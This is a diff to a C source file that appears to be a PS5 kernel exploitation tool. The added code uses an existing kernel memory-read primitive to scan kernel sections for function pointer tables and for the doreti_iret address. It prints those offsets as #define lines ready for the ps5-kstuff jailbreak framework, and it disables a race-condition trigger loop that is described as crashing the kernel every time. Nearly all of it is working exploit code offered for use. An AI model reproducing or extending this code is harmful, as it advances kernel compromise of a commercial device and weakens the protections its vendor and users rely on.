@@ -5278,6 +5278,131 @@ broad_done:
                     }
                 }
 
+                /* ---- Structural analysis of function pointer table ----
+                 *
+                 * The context dump shows candidates are in a dense table
+                 * of .text pointers.  Walk backwards/forwards from
+                 * candidate #1 to find table bounds and count entries.
+                 * Table size helps identify the structure
+                 * (sysent=~600, trap handlers=~20). */
+                if (num_near_ptrs > 0) {
+                    uint64_t tbl_anchor = near_ptrs[0].data_addr;
+                    uint64_t tbl_kdata_base =
+                        (uint64_t)KERNEL_ADDRESS_DATA_BASE;
+                    uint64_t tbl_ktext_lo = (uint64_t)ktext_base;
+                    uint64_t tbl_ktext_hi =
+                        tbl_ktext_lo + 0x2000000;
+
+                    send_response(sock,
+                        "\n  Function pointer table analysis "
+                        "(around candidate #1):\n");
+
+                    /* Walk backwards to find table start */
+                    uint64_t tbl_start = tbl_anchor;
+                    uint8_t tblbuf[4096];
+
+                    for (;;) {
+                        uint64_t check = tbl_start - 8;
+                        uint64_t page = check & ~0xFFFULL;
+                        if (kernel_copyout(page, tblbuf,
+                                sizeof(tblbuf)) != 0)
+                            break;
+                        int toff = (int)(check - page);
+                        uint64_t val;
+                        memcpy(&val, tblbuf + toff, 8);
+                        if (val >= tbl_ktext_lo &&
+                            val < tbl_ktext_hi)
+                            tbl_start = check;
+                        else
+                            break;
+                        if ((tbl_anchor - tbl_start) / 8 > 2048)
+                            break;
+                    }
+
+                    /* Walk forwards to find table end */
+                    uint64_t tbl_end = tbl_anchor + 8;
+
+                    for (;;) {
+                        uint64_t page = tbl_end & ~0xFFFULL;
+                        if (kernel_copyout(page, tblbuf,
+                                sizeof(tblbuf)) != 0)
+                            break;
+                        int toff = (int)(tbl_end - page);
+                        if (toff + 8 > (int)sizeof(tblbuf))
+                            break;
+                        uint64_t val;
+                        memcpy(&val, tblbuf + toff, 8);
+                        if (val >= tbl_ktext_lo &&
+                            val < tbl_ktext_hi)
+                            tbl_end = tbl_end + 8;
+                        else
+                            break;
+                        if ((tbl_end - tbl_anchor) / 8 > 2048)
+                            break;
+                    }
+
+                    int tbl_count =
+                        (int)((tbl_end - tbl_start) / 8);
+                    int cand_index =
+                        (int)((tbl_anchor - tbl_start) / 8);
+
+                    send_response(sock,
+                        "  Table bounds: kdata+0x%lx .. "
+                        "kdata+0x%lx\n"
+                        "  Entries: %d  "
+                        "Candidate #1 at index: %d\n",
+                        tbl_start - tbl_kdata_base,
+                        tbl_end - tbl_kdata_base,
+                        tbl_count, cand_index);
+
+                    /* Characterize the table */
+                    const char *tbl_type = "unknown";
+                    if (tbl_count >= 500 && tbl_count <= 700)
+                        tbl_type =
+                            "sysent (~600 syscalls)";
+                    else if (tbl_count >= 15 &&
+                             tbl_count <= 30)
+                        tbl_type =
+                            "trap handler table (~20 vectors)";
+                    else if (tbl_count >= 200 &&
+                             tbl_count <= 300)
+                        tbl_type =
+                            "idt handler table (~256 vectors)";
+                    else if (tbl_count >= 2 &&
+                             tbl_count <= 14)
+                        tbl_type = "small function table";
+
+                    send_response(sock,
+                        "  Likely structure: %s\n", tbl_type);
+
+                    /* Check if #GP handler is in this table */
+                    int gp_in_table = 0;
+                    for (uint64_t a = tbl_start;
+                         a < tbl_end; a += 8) {
+                        uint64_t page = a & ~0xFFFULL;
+                        if (kernel_copyout(page, tblbuf,
+                                sizeof(tblbuf)) != 0)
+                            break;
+                        int toff = (int)(a - page);
+                        uint64_t val;
+                        memcpy(&val, tblbuf + toff, 8);
+                        if (val == gp_handler_va) {
+                            gp_in_table = 1;
+                            break;
+                        }
+                    }
+
+                    send_response(sock,
+                        "  #GP handler in table: %s\n",
+                        gp_in_table ? "YES" : "no");
+
+                    if (gp_in_table)
+                        send_response(sock,
+                            "  => Known trap handler shares "
+                            "this table — strengthens "
+                            "doreti_iret hypothesis\n");
+                }
+
                 /* ---- Targeted V+2 partner search (full 64MB .data) ----
                  *
                  * FreeBSD uses direct comparison in trap.c, NOT
@@ -5406,6 +5531,159 @@ broad_done:
                     send_response(sock,
                         "  No V+2 partners found in full "
                         "64MB .data scan\n");
+                }
+
+                /* ---- .rodata V+2 partner search ----
+                 *
+                 * .data search found nothing. .rodata sits between
+                 * .text and .data on FreeBSD. Compiler-generated
+                 * constant/switch tables could reference
+                 * doreti_iret+2. Scan from estimated .text end to
+                 * .data start. XOM pages will fail kernel_copyout
+                 * — skip silently. */
+                {
+                    /* Estimate .text end: ktext_base + 16MB */
+                    uint64_t rodata_start =
+                        (uint64_t)ktext_base + 0x1000000;
+                    uint64_t rodata_end =
+                        (uint64_t)KERNEL_ADDRESS_DATA_BASE;
+
+                    if (rodata_start < rodata_end) {
+                        int rd_count = num_near_ptrs < 16 ?
+                                       num_near_ptrs : 16;
+                        uint64_t rd_targets[16];
+                        int rd_found[16];
+                        uint64_t rd_found_at[16];
+                        for (int i = 0; i < rd_count; i++) {
+                            rd_targets[i] =
+                                near_ptrs[i].text_va + 2;
+                            rd_found[i] = 0;
+                            rd_found_at[i] = 0;
+                        }
+
+                        uint64_t rd_size =
+                            rodata_end - rodata_start;
+                        send_response(sock,
+                            "\n  .rodata V+2 search "
+                            "(%d candidates, %luMB "
+                            "region)...\n",
+                            rd_count,
+                            (unsigned long)(rd_size >> 20));
+
+                        uint8_t rdbuf[4096];
+                        int rd_total_found = 0;
+                        int rd_pages_ok = 0;
+
+                        for (uint64_t rda = rodata_start;
+                             rda < rodata_end;
+                             rda += sizeof(rdbuf)) {
+
+                            if (((rda - rodata_start) &
+                                 0xFFFFFF) == 0 &&
+                                rda != rodata_start)
+                                send_response(sock,
+                                    "  ...%luMB\n",
+                                    (unsigned long)(
+                                        (rda - rodata_start)
+                                        >> 20));
+
+                            if (kernel_copyout(rda, rdbuf,
+                                    sizeof(rdbuf)) != 0)
+                                continue; /* XOM — skip */
+
+                            rd_pages_ok++;
+
+                            for (int off = 0;
+                                 off <=
+                                 (int)sizeof(rdbuf) - 8;
+                                 off += 8) {
+                                uint64_t val;
+                                memcpy(&val,
+                                       rdbuf + off, 8);
+
+                                for (int c = 0;
+                                     c < rd_count; c++) {
+                                    if (val ==
+                                        rd_targets[c] &&
+                                        !rd_found[c]) {
+                                        rd_found[c] = 1;
+                                        rd_found_at[c] =
+                                            rda + off;
+                                        rd_total_found++;
+                                        send_response(sock,
+                                            "  *** .rodata "
+                                            "V+2 MATCH: "
+                                            "candidate #%d "
+                                            "ktext+0x%lx "
+                                            "-> V+2 at "
+                                            "0x%lx ***\n",
+                                            c + 1,
+                                            near_ptrs[c]
+                                                .text_va -
+                                            (uint64_t)
+                                                ktext_base,
+                                            rda + off);
+                                    }
+                                }
+                            }
+                        }
+
+                        send_response(sock,
+                            "  .rodata scan: %d readable "
+                            "pages, %d V+2 matches\n",
+                            rd_pages_ok, rd_total_found);
+
+                        if (rd_total_found > 0) {
+                            for (int c = 0;
+                                 c < rd_count; c++) {
+                                if (!rd_found[c]) continue;
+                                uint64_t va =
+                                    near_ptrs[c].text_va;
+                                uint64_t koff =
+                                    va - (uint64_t)ktext_base;
+                                send_response(sock,
+                                    "\n  *** doreti_iret = "
+                                    "0x%lx "
+                                    "(ktext+0x%lx) ***\n"
+                                    "  .rodata V+2 at "
+                                    "0x%lx\n"
+                                    "  Confidence: HIGH "
+                                    "(.rodata V+2 "
+                                    "partner)\n",
+                                    va, koff,
+                                    rd_found_at[c]);
+
+                                if (num_candidates <
+                                    MAX_DORETI_CANDIDATES) {
+                                    candidates[
+                                        num_candidates]
+                                        .paddr =
+                                        have_text_pa ?
+                                        text_pa + koff : 0;
+                                    candidates[
+                                        num_candidates]
+                                        .ktext_offset =
+                                        koff;
+                                    candidates[
+                                        num_candidates]
+                                        .has_swapgs_before
+                                        = 1;
+                                    candidates[
+                                        num_candidates]
+                                        .near_handler = 13;
+                                    candidates[
+                                        num_candidates]
+                                        .page_dist = 0;
+                                    num_candidates++;
+                                }
+                                goto classify;
+                            }
+                        }
+                    } else {
+                        send_response(sock,
+                            "\n  .rodata V+2 search: "
+                            "skipped (region empty)\n");
+                    }
                 }
 
                 /* Hybrid candidate ranking from .data pointers.
@@ -5566,6 +5844,69 @@ broad_done:
                     }
                 }
             }
+
+            /* ---- ps5-kstuff candidate output ----
+             *
+             * Output the recommended doreti_iret offset and
+             * alternates in a format directly usable by
+             * ps5-kstuff. */
+            if (num_near_ptrs > 0) {
+                uint64_t best_va = near_ptrs[0].text_va;
+                uint64_t best_koff =
+                    best_va - (uint64_t)ktext_base;
+                uint64_t gp_koff =
+                    gp_handler_va - (uint64_t)ktext_base;
+
+                send_response(sock,
+                    "\n"
+                    "========================================"
+                    "========\n"
+                    "  ps5-kstuff doreti_iret candidates\n"
+                    "========================================"
+                    "========\n\n");
+
+                send_response(sock,
+                    "  Recommended (candidate #1, "
+                    "dist=%+ld):\n"
+                    "    #define DORETI_IRET_OFFSET  "
+                    "0x%lx\n\n",
+                    (long)near_ptrs[0].dist, best_koff);
+
+                send_response(sock,
+                    "  This boot's full VA: 0x%lx\n"
+                    "  ktext base:          0x%lx\n"
+                    "  #GP handler:         "
+                    "ktext+0x%lx\n\n",
+                    best_va, (uint64_t)ktext_base,
+                    gp_koff);
+
+                /* Alternate candidates */
+                int alt_count = num_near_ptrs < 5 ?
+                                num_near_ptrs : 5;
+                if (alt_count > 1) {
+                    send_response(sock,
+                        "  Alternates (if #1 is wrong):\n");
+                    for (int i = 1; i < alt_count; i++) {
+                        uint64_t akoff =
+                            near_ptrs[i].text_va -
+                            (uint64_t)ktext_base;
+                        send_response(sock,
+                            "    #%d: "
+                            "#define DORETI_IRET_OFFSET"
+                            "  0x%lx  (dist=%+ld)\n",
+                            i + 1, akoff,
+                            (long)near_ptrs[i].dist);
+                    }
+                }
+
+                send_response(sock,
+                    "\n  Note: ktext offsets are stable "
+                    "across boots (KASLR changes base "
+                    "only).\n"
+                    "========================================"
+                    "========\n");
+            }
+
             #undef MAX_NEAR_PTRS
         }
 
@@ -6408,8 +6749,19 @@ broad_done:
         send_response(sock, "\n  WARNING: IDT is now live — each attempt risks\n"
                       "  kernel panic if the CS race loses.\n");
         send_response(sock, "  Starting trigger loop (50 attempts max)...\n");
+
+        send_response(sock,
+            "\n  *** SKIPPING trigger loop ***\n"
+            "  Race is unwinnable on PS5 (100%% panic rate "
+            "across 4 tests).\n"
+            "  Same-core L1 cache advantage: kernel reads CS "
+            "in ~15ns,\n"
+            "  cross-core MOESI invalidation takes "
+            "~40-70ns.\n"
+            "  Using analysis-only approach.\n\n");
+
         {
-            int max_attempts = 50;
+            int max_attempts = 0; /* skip — race is unwinnable */
             gp_trap_attempt_count = 0;
             gp_trap_got_result = 0;
             gp_trap_doreti_addr = 0;
